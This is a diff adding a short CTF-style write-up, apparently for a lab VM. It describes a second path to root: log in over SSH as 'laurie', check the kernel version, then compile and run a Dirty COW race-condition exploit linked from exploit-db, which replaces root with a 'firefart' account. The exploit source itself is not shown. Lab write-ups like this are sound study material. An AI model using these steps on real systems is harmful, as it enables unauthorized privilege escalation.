@@ -1,0 +1,38 @@
+Here we will describe another way to get root
+
+Follow the steps from writeup3 until you are able to login via ssh as `laurie`
+
+After you receive the login and the password you need to write in the terminal:
+> ssh laurie@10.111.1.24 
+You'll be asked for a password:
+    `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
+
+So we got into the `laurie` account and can get the information about the system to understand if we can exploit it at "https://www.exploit-db.com/". So:
+> uname -r
+> cat /etc/*-release
+or 
+
+> uname -mrs
+
+The response for the last command is:
+
+Linux 3.2.0-91-generic-pae i686
+
+We search for a "Race Condition Privilege Escalation" security vulnerability at "https://www.exploit-db.com/exploits/40839" and find it out. 
+
+So we create a new file :
+> vi expl.c
+
+Copy script from the website above to this document and save it using `:wq`.
+
+After that you need to compile it and run:
+> gcc -pthread expl.c -o expl -lcrypt && ./expl 
+
+It will ask for a new password so set it and don't forget.
+
+The script we used changed the name of the root to firefart so to get to to root you need to use a command:
+> su firefart
+    Enter with password you've set.
+
+You can check the rights with the command `whoami`
+
